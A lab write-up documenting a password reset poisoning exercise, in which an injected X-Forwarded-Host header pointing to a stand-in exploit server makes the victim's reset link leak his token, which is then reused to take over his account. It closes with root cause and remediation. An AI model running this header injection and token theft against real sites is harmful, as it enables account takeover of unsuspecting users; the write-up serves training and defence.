# Lab Documentation: Password Reset Poisoning via Middleware

## Lab

**Name:** Password Reset Poisoning via Middleware
**Difficulty:** Practitioner

## Objective

Exploit the password reset functionality by poisoning the password reset link using the `X-Forwarded-Host` header. Capture Carlos's password reset token, reset his password, and log in to his account.

---

# Steps Performed

### 1. Investigate the Password Reset Functionality

* Logged in using the provided credentials:

  * **Username:** wiener
  * **Password:** peter
* Clicked **Forgot your password?**
* Requested a password reset.
* Opened the email from the email client and observed that it contained a password reset link with a unique token.

### 2. Analyze the Password Reset Request

Intercepted the request with Burp Suite and sent the **POST /forgot-password** request to **Burp Repeater**.

Discovered that the application trusted the `X-Forwarded-Host` header when generating password reset URLs.

### 3. Poison the Reset Link

Added the following header to the request:

```http
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

Modified the request body:

```text
username=carlos
```

Sent the request.

### 4. Capture Carlos's Reset Token

Carlos received the poisoned password reset email and clicked the link.

Because the reset link pointed to the exploit server, his browser sent a request containing the password reset token.

Viewed the exploit server **Access Log** and extracted the value of:

```text
temp-forgot-password-token
```

### 5. Obtain a Valid Reset Page

Requested a password reset for **wiener**.

Opened the legitimate password reset email and copied the reset URL.

Example:

```text
https://LAB-ID.web-security-academy.net/forgot-password?temp-forgot-password-token=YOUR_TOKEN
```

### 6. Replace the Token

Edited the legitimate reset URL by replacing your own token with Carlos's stolen token.

Example:

```text
temp-forgot-password-token=CARLOS_TOKEN
```

Loaded the modified URL in the browser.

### 7. Reset Carlos's Password

Entered a new password for Carlos and submitted the form.

The application accepted the stolen token and successfully reset Carlos's password.

### 8. Verify the Attack

Logged in using:

* **Username:** carlos
* **Password:** (new password chosen)

Successfully accessed Carlos's account, completing the lab.

---

# Key Findings

* The application trusted the `X-Forwarded-Host` header when generating password reset links.
* Password reset emails could be poisoned to point to an attacker-controlled server.
* The victim unknowingly leaked their password reset token by following the malicious link.
* Possession of the valid reset token allowed complete account takeover.

# Vulnerability

**Password Reset Poisoning via Middleware**

The application used an untrusted HTTP header to construct password reset URLs, allowing an attacker to redirect password reset links to an attacker-controlled domain.

# Impact

An attacker can:

* Capture password reset tokens.
* Reset other users' passwords.
* Take over arbitrary accounts.
* Gain unauthorized access without knowing user credentials.

# Root Cause

The application trusted client-controlled headers (`X-Forwarded-Host`) when generating password reset links instead of using a trusted server-side hostname.

# Remediation

* Ignore untrusted forwarding headers when generating password reset URLs.
* Use a fixed, server-side configured hostname for all password reset links.
* Validate and sanitize proxy headers at trusted reverse proxies.
* Configure reverse proxies to remove or overwrite untrusted forwarding headers.
* Generate single-use, short-lived password reset tokens and invalidate them immediately after use.
